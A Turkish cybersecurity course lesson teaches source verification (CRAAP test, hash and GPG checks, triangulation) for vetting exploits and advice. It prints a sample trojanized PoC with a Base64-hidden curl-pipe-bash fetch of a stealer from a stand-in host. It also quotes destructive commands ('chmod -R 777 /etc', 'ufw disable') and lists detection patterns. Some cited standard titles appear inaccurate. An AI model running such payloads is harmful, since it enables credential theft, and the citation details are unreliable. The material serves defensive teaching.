# GÜN 013: Güvenli Araştırma ve Kaynak Doğrulama
**Aşama 01: Temel Güvenlik ve Altyapı | Hafta 02: Sanallaştırma ve Laboratuvar Temelleri**

> **ÖZEL LİSANS — TÜM HAKLAR SAKLIDIR**  
> Telif Hakkı (c) 2026 Seydi Eryılmaz (@seydivakkas)  
> Bu yazılım ve eğitim materyalleri yalnızca görüntüleme ve kişisel öğrenim amaçlıdır.  
> Kopyalanamaz, çoğaltılamaz, dağıtılamaz, ticari amaçla kullanılamaz. Açık kaynak lisanslar (MIT, Apache, GPL vb.) KULLANILMAZ.

---

## 🧭 1. Hocanın Giriş Sohbeti & Zihinsel Model

Evlat, bugün masamızda bir siber güvenlik uzmanının zihinsel pusulasını belirleyen en hayati disiplin var: **Güvenli Araştırma, Tehdit İstihbaratı ve Kaynak Doğrulama (Source Verification & Triangulation)**.

Şu analojiyi kafanda canlandır:
Bir tıp doktoru olduğunu düşün. Acil servise nefes darlığı çeken bir hasta geliyor. Sen bu hastayı tedavi etmek için tıp fakültesi kütüphanesindeki hakemli akademik yayınlara ve Sağlık Bakanlığı'nın resmî kılavuzlarına mı bakarsın; yoksa arama motorunda ilk sırada çıkan, yazarının kim olduğu belirsiz, 2010 tarihli bir forum sitesindeki "nane limon kaynatıp içine sirke dökün" diyen anonim bir kullanıcının tavsiyesine mi uyarsın? İkincisini yaparsan hastayı öldürürsün ve hapse girersin, değil mi?

İşte siber güvenlikte de durum zerre kadar farklı değildir!  
Bir SOC analisti, zafiyet araştırmacısı veya sistem yöneticisi olarak her gün yeni bir kritik güvenlik açığı (CVE), yeni bir saldırı tekniği veya bir sunucu sertleştirme yönergesi ile karşılaşacaksın. Google'da ya da GitHub'da karşına çıkan ilk linke tıklayıp, oradaki betiği veya çözümü sorgusuz sualsiz kurumsal sistemine ya da kendi bilgisayarına kopyalarsan, kurumu bizzat kendi ellerinle hacklemiş olursun!

Neden mi? Çünkü siber saldırganlar da aptal değil. Dünyada yeni ve kritik bir zafiyet duyurulduğunda (örneğin Log4Shell veya Spring4Shell), binlerce güvenlik uzmanının panikle Google'a ve GitHub'a koşacağını çok iyi bilirler. Saldırganlar hemen bir GitHub deposu açar; adını `CVE-2024-XXXX-auto-exploit-poc` koyarlar. İçine öyle bir Python kodu yazarlar ki, araştırmacı zafiyeti test etmek için o kodu çalıştırdığında, arka planda araştırmacının SSH anahtarlarını, şifrelerini ve tarayıcı çerezlerini çalan bir Truva Atı (Trojanized PoC) devreye girer! Bu yaşanmış gerçek bir vakadır; Kuzey Koreli devlet destekli APT grubu **Lazarus**, 2021 ve 2023 yıllarında sahte güvenlik araştırmacısı profilleri açarak yüzlerce batılı siber güvenlik uzmanını bizzat sahte istismar kodlarıyla hacklemiştir!

Bugün bir bilginin, bir betiğin veya bir yamanın güvenilirliğini **CRAAP Testi**, **Kriptografik İmzalar (GPG/SHA-256)** ve **Çapraz Teyit (Triangulation)** mekanizmasıyla nasıl bir istihbarat analisti titizliğiyle süzeceğini öğreneceksin.

---

## 🔬 2. Sıfırdan Kristal Netliğinde Teori (Under the Hood)

Siber güvenlikte "bilgi" ham bir veridir; doğrulanmadığı sürece dedikodudan farksızdır. Bir bilginin operasyonel güvenlik kararına dönüşebilmesi için belirli bir güven hiyerarşisinden geçmesi gerekir.

```
+-------------------------------------------------------------------------------+
|             SİBER TEHDİT İSTİHBARATI KAYNAK GÜVENİLİRLİK PİRAMİDİ             |
+-------------------------------------------------------------------------------+

                      /\
                     /  \     [SEVİYE 1: BİRİNCİL RESMÎ YETKİLİ KAYNAKLAR]
                    / L1 \    NIST NVD, MITRE ATT&CK, Üretici Güvenlik Bülteni
                   /------\   (Microsoft MSRC, Cisco PSIRT, Red Hat, RFC)
                  /        \  Kriptografik İmza: GPG + SHA-256 (Otorite: 95-100)
                 /    L2    \
                /------------\ [SEVİYE 2: HAKEMLİ KURUMSAL ARAŞTIRMA LABLARI]
               /              \ Google Project Zero, Mandiant, Talos, Unit 42
              /       L3       \ Derin teknik tersine mühendislik (Otorite: 80-90)
             /------------------\
            /                    \ [SEVİYE 3: SAYGIN TOPLULUK & KONFERANSLAR]
           /          L4          \ Black Hat, DEF CON, USENIX, Güvenilir Güvenlik Blogları
          /------------------------\ İmzalı teknik sunumlar (Otorite: 65-75)
         /                          \
        /             L5             \ [SEVİYE 4: DOĞRULANMAMIŞ FORUM & BLOGLAR]
       /------------------------------\ Reddit, StackOverflow, Eski Forumlar (2011)
      /                                \ Hakemsiz, hatalı 'chmod 777' riski (Otorite: 20-40)
     /               L6                 \
    /------------------------------------\ [SEVİYE 5: ZEHİRLİ TRUVA ATI / SAHTE PoC]
                                           Anonim GitHub depoları, Base64 gizli 'curl | sh'
                                           Tedarik zinciri saldırısı (Otorite: 0 - ZARARLI!)
```

### A. CRAAP Değerlendirme Modeli
Kütüphanecilik ve bilimsel araştırma metodolojisinden siber güvenliğe uyarlanan CRAAP testi 5 temel sütundan oluşur:

| Kriter | Anlamı (TR/EN) | Siber Güvenlikteki Karşılığı ve Kontrol Sorusu | Puan Ağırlığı |
| :--- | :--- | :--- | :---: |
| **C** | **Currency** (Güncellik) | Bu bilgi ne zaman yayınlandı? En son ne zaman güncellendi? (2012 tarihli bir Linux cevabı bugün sistemi savunmasız bırakabilir!) | 20 |
| **R** | **Relevance** (İlgililik) | Bu çözüm doğrudan benim hedef sistemim, işletim sistemi sürümüm ve zafiyetimle birebir örtüşüyor mu? | 20 |
| **A** | **Authority** (Otorite) | Bu bilginin kaynağı kim? Yazarı belli mi? Kurumsal bir CERT, üretici veya tanınmış bir araştırmacı mı? | 25 |
| **A** | **Accuracy** (Doğruluk & Kanıt) | Verilen teknik iddia kanıtlanabilir mi? Kriptografik GPG imzası veya SHA-256 sağlama değeri var mı? Resmî CVE/CWE referansı içeriyor mu? | 25 |
| **P** | **Purpose** (Amaç & Niyet) | Bu bilginin amacı nedir? Savunma amaçlı bir danışmanlık mı, yoksa tıklama/reklam tuzağı ya da kötü niyetli bir oltalama mı? | 10 |

### B. Çapraz Kaynak Teyidi (Source Triangulation)
İstihbarat dünyasında "tek kaynaktan alınan bilgi bilgi değildir, iddiadır". Bir güvenlik açığının varlığını, etki alanını ve yama yöntemini doğrulamak için **en az iki bağımsız ve güvenilir kaynaktan** çapraz teyit (triangulation) alınmalıdır:
- **Kaynak 1 (Birincil):** NIST NVD veri tabanındaki resmî CVE skoru ve etkilenen yazılım sürümleri.
- **Kaynak 2 (Üretici Doğrulaması):** Yazılımın resmî üreticisinin yayınladığı Güvenlik Bülteni (Security Advisory) ve yamayı içeren commit hash'i.
- Eğer bir forumda veya blogda "üreticinin yamasına gerek yok, şu konfigürasyon satırını kapatın yeter" deniliyorsa, bu iddia resmî üretici bülteniyle doğrulanmadıkça **asla** uygulanmaz.

---

## ⚔️ 3. İki Yönlü Bakış: Saldırganın Gözü vs Savunmacının Kalkanı

### 🔴 Saldırganın Gözü (Offensive Perspective)
Saldırganlar bilgi arayan personelin zaaflarını ve aceleciliğini istismar etmek için şu taktikleri kullanır:
1. **Zehirli İstismar Kodu (Trojanized PoC):**  
   Yeni çıkan bir RCE (Remote Code Execution) açığı için sahte GitHub deposu açılır. Kodun ilk satırları zararsız görünür; ancak derinlerde Base64 ile gizlenmiş bir yük bulunur:
   ```python
   import os, base64
   # Görünüşte zafiyeti tetikleyen kod
   print("[*] Exploit gonderiliyor...")
   # Arka planda gizlice calisan gercek yuk:
   payload = "Y3VybCAtcyBodHRwOi8vZXZpbC1kb21haW4uY29tL3N0ZWFsZXIgfCBiYXNo"
   os.system(f"echo {payload} | base64 -d | bash >/dev/null 2>&1")
   ```
   Bu kod çalıştığı anda araştırmacının tüm `~/.ssh/id_rsa`, `~/.aws/credentials` ve tarayıcı çerezleri saldırganın sunucusuna uçar!
2. **Arama Motoru Zehirlemesi (SEO Poisoning / Malvertising):**  
   "WinSCP download", "PuTTY indir", "Cisco VPN client update" gibi popüler aramaların arama motoru reklamları satın alınır. Dikkatsiz kullanıcı ilk sıradaki reklama tıklayarak resmî site yerine zararlı gömülmüş sahte `.exe` dosyasını indirir.
3. **Yıkıcı Tavsiye Tuzağı (Destructive Advice):**  
   Forum sitelerinde "bağlantı sorununu çözmek için `chmod -R 777 /etc` yapın" veya "güvenlik duvarını tamamen kapatın `ufw disable`" diyen eski veya kötü niyetli girdilerle sistemler kolay av haline getirilir.

### 🔵 Savunmacının Kalkanı (Defensive Perspective)
1. **Kriptografik İmza ve Hash Teyidi:**  
   İndirilen hiçbir yazılım, yama veya betik SHA-256 özeti resmî üretici bülteniyle karşılaştırılmadan ve GPG imzası doğrulanmadan çalıştırılamaz.
2. **Karantina / Sandbox İzolasyonu:**  
   GitHub'dan veya topluluktan indirilen test betikleri ASLA ana bilgisayarda çalıştırılmaz. İnternet erişimi kesilmiş izole analiz VM'inde, önce satır satır statik kod incelemesi yapılır.
3. **Resmî Alan Adı Teyidi:**  
   Yazılımlar daima resmî birincil alan adlarından (`vendor.com`, `nvd.nist.gov`, `cve.org`) indirilir; URL yapısı harf harf kontrol edilir (Typosquatting avı: `putty.org` yerine `puTTY-download.com` gibi sahte alanlar engellenir).

---

## 🛠️ 4. Hocayla Birlikte Canlı Laboratuvar

Şimdi terminalimizde bir dosyanın veya kaynağın doğruluğunu teyit etmek için kullanacağımız gerçek komutları uygulayacağız.

### Adım 1: PowerShell Üzerinde Kriptografik SHA-256 Doğrulaması
İndirdiğin bir yama dosyasının veya aracın üretici tarafından verilen hash ile eşleştiğini doğrulamak için:

```powershell
# 1. Dosyanın SHA-256 özetini hesapla
Get-FileHash -Path "ornek_dosya.zip" -Algorithm SHA256

# 2. Üretici bültenindeki hash ile doğrudan karşılaştır
$BeklenenHash = "A1B2C3D4E5F60718293A4B5C6D7E8F90123456789ABCDEF0123456789ABCDEF0"
$HesaplananHash = (Get-FileHash -Path "ornek_dosya.zip" -Algorithm SHA256).Hash

if ($HesaplananHash -eq $BeklenenHash) {
    Write-Host "[+] BÜTÜNLÜK ONAYLANDI: Dosya orijinal ve değiştirilmemiş." -ForegroundColor Green
} else {
    Write-Host "[-] KRİTİK ALARM: Hash uyuşmuyor! Dosya tahrif edilmiş veya bozuk!" -ForegroundColor Red
}
```

### Adım 2: Linux Terminalinde GPG İmza ve Hash Kontrolü
```bash
# 1. Linux üzerinde SHA-256 kontrolü
sha256sum yama_paketi.tar.gz

# 2. GPG dijital imzasını resmî üretici anahtarıyla doğrula
gpg --verify yama_paketi.tar.gz.asc yama_paketi.tar.gz
```

### Adım 3: Geliştirdiğimiz Doğrulama Aracı ile Çapraz Kaynak Teyidi
Laboratuvarımızdaki vakaları CRAAP modeliyle analiz edip çapraz teyit icra edelim:

```bash
# 1. Veri tabanındaki tüm vakaları analiz et
python portfolio/hafta_02/gun_013/uygulama/security_source_validator.py --veri-tabani portfolio/hafta_02/gun_013/ornek_veri/guvenlik_arastirma_kaynaklari.json --tumunu-denetle

# 2. RCE Zafiyeti (VAKA-01) için resmî NVD ile sahte GitHub PoC'u karşılaştır
python portfolio/hafta_02/gun_013/uygulama/security_source_validator.py --veri-tabani portfolio/hafta_02/gun_013/ornek_veri/guvenlik_arastirma_kaynaklari.json --vaka-id VAKA-CVE-RCE-01 --karsilastir

# 3. Linux Sertleştirme (VAKA-02) için CIS Benchmark ile eski forum gönderisini karşılaştır
python portfolio/hafta_02/gun_013/uygulama/security_source_validator.py --veri-tabani portfolio/hafta_02/gun_013/ornek_veri/guvenlik_arastirma_kaynaklari.json --vaka-id VAKA-LINUX-HARDENING-02 --karsilastir
```

---

## ⚠️ 5. Hocanın "Ölümcül Hatalar" Notu

1. **GitHub'dan İndirilen PoC Kodunu Okumadan Çalıştırmak:**  
   Yeni çıkan bir zafiyette heyecanla indirilen Python/C kodunun içinde gizlenmiş tersine kabuk (reverse shell) veya bilgi hırsızı (infostealer) kodlarını fark etmeyip kendi bilgisayarında çalıştırmak, siber güvenlik dünyasındaki en utanç verici "kendi kendini hackleme" felaketidir.
2. **10 Yıllık Forum Cevaplarını Kopyala-Yapıştır Yapmak:**  
   2011 yılında yazılmış "bağlanamıyorsanız `chmod 777` yapın" veya "SSL doğrulamasını `verify=False` ile kapatın" diyen StackOverflow/Forum cevaplarını modern üretim sistemine yapıştırmak kurumu açık hedef haline getirir.
3. **Arama Motorunun İlk Sonucuna Körlemesine Güvenmek:**  
   Saldırganlar Google Ads reklamlarıyla resmî sitelerin birebir kopyasını en tepeye koyarlar. Alan adını (URL) harf harf kontrol etmeden dosya indirmek doğrudan zararlı bulaşmasına yol açar.
4. **Tek Bir Blog Yazısına Dayanarak Mimari Değiştirmek:**  
   Bir siber güvenlik analisti, üretici güvenlik bülteni veya resmî CERT uyarısı olmaksızın, sırf bir blog yazarının spekülatif iddiasına dayanarak güvenlik duvarı kuralı değiştiremez veya yamayı erteleyemez.

---

## 🎯 6. Günün Pratik Görevi + Çözüm Yürüyüşü

### Pratik Görev Tanımı:
Aşama 01 Hafta 02 kapsamındaki sentetik veri tabanında (`guvenlik_arastirma_kaynaklari.json`) yer alan iki vakayı incelemek:
1. `VAKA-CVE-RCE-01`: Resmî NVD/MSRC bülteni ile şüpheli anonim GitHub PoC deposunun CRAAP kriterlerine göre karşılaştırılması ve zehirli Truva Atı (`curl | sh`) sinyalinin saptanması.
2. `VAKA-LINUX-HARDENING-02`: CIS Ubuntu Benchmark standardı ile 2011 tarihli eski forum girdisinin karşılaştırılarak `chmod 777` yıkıcı tavsiyesinin elenmesi.

### Adım Adım Çözüm Yürüyüşü:
1. **Veri Tabanının Yüklenmesi:** `ornek_veri/guvenlik_arastirma_kaynaklari.json` dosyası yüklendi.
2. **CRAAP Puanlamasının İcrası:**
   - `SRC-NVD-OFFICIAL`: 95 puan, güncel (2026), otoriter devlet/üretici alan adı, SHA-256 ve GPG mevcut -> **GUVENILIR_ONAYLI**.
   - `SRC-GITHUB-ANON-POC`: 10 puan, anonim yazar, imza yok, içerikte `curl loader.sh | sh` gizli kodu tespit edildi -> **GUVENSIZ_REDDEDILDI (FELAKET - FLAG-04)**.
   - `SRC-CIS-BENCHMARK`: 95 puan, uluslararası konsorsiyum standardı, GPG/SHA-256 tam -> **GUVENILIR_ONAYLI**.
   - `SRC-LEGACY-FORUM-POST`: 15 puan, 15 yıllık eski içerik (FLAG-01), imza yok (FLAG-03), `chmod 777` yıkıcı tavsiyesi içeriyor (FLAG-05) -> **GUVENSIZ_REDDEDILDI**.
3. **Çapraz Teyit Kararı (Triangulation):** Motor iki vakada da resmî/kurumsal olanı onayladı, tehlikeli olanı gerekçeleriyle reddetti.
4. **Test Paketi Doğrulaması:** 14 birim test ile pozitif akış ve kırmızı bayrak kontrolleri 0.003 saniyede %100 başarıyla onaylandı.

---

## ❓ 7. Hocanın Soru Odası

### Soru 1 (G013-SC1): Güvenli araştırma ve kaynak doğrulama: Temel mekanizmayı ve güvenlik önemini açıkla.

#### 1. Net ve Doğrudan Yanıt
Güvenli araştırma ve kaynak doğrulama; siber güvenlikte zafiyet, tehdit ve savunma yöntemlerine dair toplanan ham bilgilerin CRAAP testi, kriptografik bütünlük (GPG/SHA-256) ve kaynak hiyerarşisi ilkeleriyle filtrelenerek doğrulanması sürecidir. Bir blog yazısı, resmî üretici bülteni ve doğrulanmamış bir forum cevabı asla aynı kanıt seviyesinde değildir; doğrulanmamış kaynaklara güvenmek kurumsal sistemlere sahte yama, zafiyetli konfigürasyon veya doğrudan Truva Atı sokulmasına yol açar.

#### 2. Derin Teknik Gerekçe ve Mantık
Siber güvenlik bilgi ekosistemi asimetrik bir bilgi kirliliğine sahiptir. Yeni çıkan zafiyetlerde (1-day / 0-day) saldırganlar bilinçli olarak dezenformasyon yayar, SEO zehirlemesi yapar veya GitHub üzerinde araştırmacıları hedef alan tuzak PoC (Trojanized Proof-of-Concept) depoları yayınlar. Bu depoların içine Base64 ile gizlenmiş tersine kabuklar (reverse shell) veya bilgi hırsızları (infostealer) yerleştirilir. Savunmacı için bilginin doğrulanması; yayın tarihi (Currency), alan adı otoritesi (Authority), kriptografik sağlama toplamı (Accuracy) ve çapraz teyit (Triangulation) mekanizmasıyla yapılır. Resmî birincil kaynaklar (NIST NVD, CVE.org, Üretici MSRC/Cisco bültenleri) dijital olarak imzalanmış kesin teknik kanıt sunarken; topluluk içerikleri yalnızca izole sandbox ortamlarında statik incelemeden geçtikten sonra dikkate alınabilir.

#### 3. Yaygın Hata ve Sektör Yanılgısı
En yaygın hata, "Arama motorunda en üstte çıkan veya GitHub'da yıldız (star) almış olan kod güvenilirdir" varsayımıdır. Saldırganlar bot hesaplarla GitHub depolarına dakikalar içinde yüzlerce sahte yıldız basabilmekte ve Google reklamlarıyla en tepeye sahte indirme linkleri yerleştirebilmektedir.

#### 4. Resmî Standart ve Kaynak
- **NIST NICE Framework:** *Knowledge Skill Ability: Threat Intelligence Analysis (K0013, K0019) & Source Verification Methodologies*.
- **ISO/IEC 27001:2022 Control 5.7:** *Threat Intelligence* (Bilgilerin güvenilir, eyleme dönüştürülebilir ve doğrulanmış kaynaklardan elde edilmesi zorunluluğu).

---

### Soru 2 (G013-SC2): Güvenli araştırma ve kaynak doğrulama: Bağımsız laboratuvarın girdisi, işlemi, beklenen sonucu ve negatif kontrolü nedir?

#### 1. Net ve Doğrudan Yanıt
Laboratuvarın girdisi; aynı güvenlik konusunu ele alan iki farklı kaynağı içeren sentetik vaka verisi (`guvenlik_arastirma_kaynaklari.json`) ve CRAAP doğrulama kriterleridir (`craap_dogrulama_kriterleri.json`). İşlemi; kaynakların CRAAP kriterlerine göre puanlanması, kriptografik imza/hash denetimi ve çapraz teyit (triangulation) analizi yapılmasıdır. Beklenen sonucu; resmî ve doğrulanmış kaynağın yüksek puanla (≥80) onaylanmasıdır. Negatif kontrolü ise; zehirli Truva Atı (`curl | sh`) içeren sahte PoC'un ve `chmod 777` gibi yıkıcı tavsiyelerin kırmızı bayrakla (FLAG-04, FLAG-05) tespit edilip reddedilmesidir.

#### 2. Derin Teknik Gerekçe ve Mantık
Laboratuvar motoru (`security_source_validator.py`), girdileri hiçbir dış ağa bağlanmadan, tamamen deterministik ve güvenli bir yerel ortamda ayrıştırır. Pozitif akışta, NIST NVD ve CIS Benchmark belgeleri tam puan alarak onaylanır. Negatif kontrollerde ise:
1. Anonim GitHub PoC'u içinde gizlenmiş `curl ... | sh` komutu saptanır ve `FLAG-04-ZEHIRLI-POC-TRUVA-ATI` bayrağı ile FELAKET seviyesinde reddedilir.
2. 2011 tarihli forum gönderisi hem 5 yılı aştığı için (`FLAG-01-ESKI-KAYNAK`) hem de `chmod 777` yetki kaldırma tavsiyesi içerdiği için (`FLAG-05-YIKICI-GUVENLIK-TAVSIYESI`) elenir.
3. Kriptografik imza (GPG/SHA-256) bulunmayan kaynaklar ceza puanı alır.

#### 3. Yaygın Hata ve Sektör Yanılgısı
Sektördeki yanılgı, negatif kontrol yapılmadan araştırmanın tamamlandığını düşünmektir. Gerçek dünyada bir analistin en büyük yeteneği, doğru bilgiyi bulmaktan ziyade, doğru gibi görünen zehirli ve manipüle edilmiş bilgiyi anında tespit edip çöpe atabilme refleksidir.

#### 4. Resmî Standart ve Kaynak
- **NIST SP 800-150:** *Guide to Cyber Threat Information Sharing* (Bölüm 3.4: Information Quality and Source Trust).
- **CIS Critical Security Controls v8:** *Control 10: Centralized Security Log and Source Evaluation*.

---

### Soru 3 (G013-SC3): 'Güvenli araştırma ve kaynak doğrulama' bağlamında risk nasıl oluşur, nasıl tespit edilir ve hangi kontrolle önlenir?

#### 1. Net ve Doğrudan Yanıt
Risk; analistin acelecilik, dikkatsizlik veya eksik bilgi nedeniyle doğrulanmamış, eski veya manipüle edilmiş kaynaklardaki kod ve yönergeleri kurumsal sistemlere uygulamasıyla oluşur. Tespit; kaynak otoritesinin olmaması, kriptografik özet (SHA-256) eksikliği, kod içinde gizlenmiş (base64/obfuscated) indiriciler ve sistem günlüklerindeki olağan dışı dış bağlantı denemeleriyle yapılır. Önleme ise; CRAAP değerlendirme çerçevesi, çift kaynaklı çapraz teyit (triangulation), kriptografik imza zorunluluğu ve izole sandbox inceleme kontrolleriyle sağlanır.

#### 2. Derin Teknik Gerekçe ve Mantık
- **Risk Mekanizması:** Saldırganlar zafiyet yönetim süreçlerine sızmak için Tedarik Zinciri ve Zehirli PoC saldırılarını kullanır. Analist, bir zafiyeti doğrulamak için indirdiği betiği yönetici haklarıyla çalıştırdığında, kurumun güvenlik personeli bizzat saldırganın içerideki truva atı haline gelir.
- **Tespit Mekanizması:**
  - *Statik Kod Taraması:* İndirilen betiklerde `eval()`, `base64_decode`, `exec()`, `curl | sh` veya harici IP adreslerine yönelik ham soket bağlantılarının aranması.
  - *Sertifika ve Hash Denetimi:* Üretici bültenindeki SHA-256 ile indirilen dosyanın hash'inin uyuşmaması (Man-in-the-Middle veya sahte ayna sunucu tespiti).
- **Önleme Kontrolleri:**
  - *Çapraz Teyit Kuralı:* Bir zafiyet veya yama en az bir birincil resmî kaynaktan (NVD/Vendor PSIRT) doğrulanmadan asla canlı sisteme dokunulmaz.
  - *Sandbox Zorunluluğu:* Tüm üçüncü taraf topluluk araçları internete çıkışı engellenmiş, geçici ve geri alınabilir sanal makinelerde çalıştırılır.

#### 3. Yaygın Hata ve Sektör Yanılgısı
En ölümcül hata; "Bir güvenlik önlemini tek başına eksiksiz savunma sanmaktır." Yalnızca virüs tarayıcısına (antivirüs) güvenerek bir exploit betiğini çalıştırmak büyük bir hatadır; çünkü yeni üretilmiş özel bir Truva Atı (FUD - Fully Undetectable) antivirüs taramasını kolayca atlatabilir. Savunma ancak kaynak doğrulama ve sandbox mimarisiyle tam koruma sağlar.

#### 4. Resmî Standart ve Kaynak
- **MITRE ATT&CK Framework:** *Technique T1588.005: Obtain Capabilities: Exploits & T1195: Supply Chain Compromise*.
- **US CISA Cybersecurity Alert:** *Alert on Malicious Proof-of-Concept Exploits Targeting Security Researchers*.
